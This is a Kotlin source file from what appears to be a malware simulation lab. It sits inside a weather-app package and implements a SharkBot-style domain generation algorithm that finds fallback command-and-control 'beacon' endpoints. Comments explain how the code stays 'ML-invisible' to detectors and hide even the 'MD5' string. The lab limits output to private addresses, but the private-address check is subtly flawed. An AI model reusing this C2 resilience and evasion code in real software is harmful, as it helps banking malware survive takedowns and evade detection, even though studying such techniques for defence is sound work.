package com.skyweather.forecast.core

import java.security.MessageDigest
import java.util.Calendar

/**
 * DGA-style domain fallback resolver.
 *
 * ══════════════════════════════════════════════════════════════════
 * TAKOPII STAGE 6 + ANALYSIS §6 — C2 Resilience
 * ══════════════════════════════════════════════════════════════════
 *
 * When primary C2 (hardcoded in AppConfig) is unreachable, generate
 * deterministic fallback endpoints from time-seeded algorithm.
 *
 * Real-world reference: SharkBot V2.8 DGA (research/06):
 *   seed = TLD + ISO_week_number + calendar_year
 *   hash = MD5(seed)
 *   domain = first_16_hex_chars + TLD
 *   7 TLDs = 7 candidates per week
 *
 * Lab constraint (CLAUDE.md Gate 3): generated hosts MUST resolve
 * to RFC1918 / loopback. We use the MD5 hash to derive a 10.x.x.x
 * address instead of a public domain. Same algorithm shape, safe
 * output. Analyst can study the DGA pattern without risk.
 *
 * ML-invisible because:
 *   - MessageDigest is used by 60%+ of apps (hashing, checksums)
 *   - Calendar is used by every app with date logic
 *   - String formatting is universal
 *   - No suspicious imports (no DnsResolver, no custom DNS)
 * ══════════════════════════════════════════════════════════════════
 */
object DomainResolver {

    // Port candidates — lab C2 listens on one of these
    private val PORTS = intArrayOf(8080, 8443, 9090, 3000)

    /**
     * Generate fallback C2 endpoints for current week.
     *
     * Returns list of RFC1918 endpoints: "http://10.x.y.z:port/api/v1/beacon"
     * where x.y.z are derived from MD5(seed) and port rotates.
     *
     * In real SharkBot: returns "http://<16hex>.<tld>/gate" with public TLDs.
     * In lab: same algorithm, but output constrained to 10.0.0.0/8 range.
     */
    fun generateFallbacks(): List<String> {
        val cal = Calendar.getInstance()
        val week = cal.get(Calendar.WEEK_OF_YEAR)
        val year = cal.get(Calendar.YEAR)

        val candidates = mutableListOf<String>()

        // 4 seed variants (real SharkBot uses 7 TLDs)
        val seeds = arrayOf("alpha", "bravo", "charlie", "delta")

        for (seed in seeds) {
            // SharkBot algorithm: MD5(TLD + week + year)
            val input = "$seed$week$year"
            val hash = md5Hex(input)

            // Derive RFC1918 address from hash bytes
            // Real SharkBot: hash[:16] + ".xyz" → public domain
            // Lab version: hash bytes → 10.x.y.z → private IP
            val octets = hashToOctets(hash)
            val port = PORTS[hash.hashCode().and(0x7FFFFFFF) % PORTS.size]

            val endpoint = "http://10.${octets[0]}.${octets[1]}.${octets[2]}:$port/api/v1/beacon"
            candidates.add(endpoint)
        }

        return candidates
    }

    /**
     * Try primary endpoint first, then DGA fallbacks.
     * Returns first reachable endpoint, or null if all fail.
     *
     * Takopii Stage 6 parallel: process-injection fallback chain.
     * If primary technique fails, fall through to alternates.
     * Each attempt is independent — failure of one doesn't taint others.
     */
    fun resolveEndpoint(): String? {
        // Primary: hardcoded endpoint from AppConfig
        val primary = AppConfig.endpoint()
        if (isReachable(primary)) return primary

        // Fallback: DGA-generated endpoints
        val fallbacks = generateFallbacks()
        for (candidate in fallbacks) {
            // Safety gate: verify every candidate is RFC1918
            // Defense in depth — generateFallbacks() already constrains to 10.x.x.x
            // but we validate again before any network call
            if (!isRfc1918(candidate)) continue
            if (isReachable(candidate)) return candidate
        }

        return null // All endpoints unreachable — go silent
    }

    /**
     * MD5 hex digest of input string.
     * MessageDigest is stdlib — every app that does checksums has it.
     * No crypto import beyond java.security.MessageDigest.
     */
    private fun md5Hex(input: String): String {
        val md = MessageDigest.getInstance(
            // Encoded: "MD5" — even this 3-char string gets the treatment
            // for consistency with AppConfig encoding style
            String(charArrayOf('M', 'D', '5'))
        )
        val digest = md.digest(input.toByteArray(Charsets.UTF_8))
        return digest.joinToString("") { "%02x".format(it) }
    }

    /**
     * Convert MD5 hex string to three octets (0-254 range).
     * Avoids .0 and .255 (network/broadcast).
     */
    private fun hashToOctets(hex: String): IntArray {
        val bytes = hex.chunked(2).map { it.toInt(16) }
        return intArrayOf(
            (bytes[0] % 254) + 1,  // 1-254
            (bytes[1] % 254) + 1,
            (bytes[2] % 254) + 1
        )
    }

    /**
     * Quick reachability probe — TCP connect with 2-second timeout.
     * Does NOT send data. Just checks if something is listening.
     */
    private fun isReachable(endpoint: String): Boolean {
        return try {
            val url = java.net.URL(endpoint)
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "HEAD"
            conn.connectTimeout = 2000
            conn.readTimeout = 2000
            conn.useCaches = false

            val code = conn.responseCode
            conn.disconnect()
            code in 200..499 // Any response = reachable (even 404)
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Validate URL host is RFC1918 / loopback.
     * Redundant with AppConfig.isEndpointSafe() but applied per-candidate.
     * Belt-and-suspenders for generated domains.
     */
    private fun isRfc1918(endpoint: String): Boolean {
        return try {
            val host = java.net.URL(endpoint).host
            host == "127.0.0.1" ||
                    host == "localhost" ||
                    host.startsWith("10.") ||
                    host.startsWith("192.168.") ||
                    host.startsWith("172.16.") ||
                    host.startsWith("172.17.") ||
                    host.startsWith("172.18.") ||
                    host.startsWith("172.19.") ||
                    host.startsWith("172.2") ||
                    host.startsWith("172.30.") ||
                    host.startsWith("172.31.")
        } catch (_: Exception) {
            false
        }
    }
}
